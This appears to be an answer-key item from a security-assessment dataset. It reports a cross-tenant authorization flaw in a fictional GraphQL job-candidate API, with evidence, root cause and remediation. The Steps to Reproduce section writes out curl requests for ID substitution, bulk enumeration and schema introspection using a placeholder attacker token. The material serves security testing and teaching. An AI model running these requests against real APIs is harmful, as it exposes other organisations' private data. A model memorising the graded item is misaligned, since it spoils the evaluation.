# Expected Response

## System
- Domain: HR Tech / Talent Acquisition
- System: JobCore Candidate Portal
- Example ID: GQL-0409

## Priority Findings

### Finding 1: GraphQL BOLA — Semantic ambiguity (over-broad endpoints) (Pattern 3.3)
**Severity:** Critical
**Category:** Insecure Design

**Summary:**
The GraphQL API at `POST /graphql` contains a Pattern 3.3 (Semantic ambiguity (over-broad endpoints)) vulnerability.
An authenticated user belonging to `tenant-19d5` can access or manipulate objects owned by
`tenant-9d48` by supplying a cross-tenant `candidateId` in the GraphQL query/mutation.

**Evidence from HAR:**
- Request JWT claim `tenantId`: `tenant-19d5`
- Response body `tenantId`: `tenant-9d48` — **mismatch confirms cross-tenant data access**
- Response HTTP status: `200 OK` — no authorization error raised by the resolver
- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-9d48`

**Root Cause:**
The resolver fetches the candidate by `candidateId` directly from the database without joining
against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
`tenantId` claim is never used as a WHERE clause predicate.

## Steps to Reproduce

### Step 1 — Establish attacker baseline
```bash
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-19D5>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getCandidate(id: \"C-1409\") { candidateId tenantId ownerId data { sensitiveField } } }"}' 
```
**Expected baseline:** Returns `tenantId: "tenant-19d5"` — this is the attacker's own object.

### Step 2 — Cross-tenant ID substitution
```bash
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-19D5>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getCandidate(id: \"C-2409\") { candidateId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
```
**Vulnerable outcome:** Returns `tenantId: "tenant-9d48"` and full `sensitiveField` — **BOLA confirmed**.
**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.

### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
```bash
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-19D5>" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { bulkCandidateLookup(ids: [\"C-2409\", \"C-3409\", \"C-4409\"]) { candidateId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns objects from multiple tenants in a single response.

### Step 4 — Introspection probe (if Pattern 6.1 also present)
```bash
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-19D5>" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
```
**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.

## Secure Outcome Verification
For **Step 2**, the secure implementation MUST return:
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getCandidate": null } }
```

## Remediation
1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE candidateId = $id AND tenant_id = $jwtTenantId`.
2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
3. **Per-ID ownership filter for bulk operations:** In `bulkCandidateLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
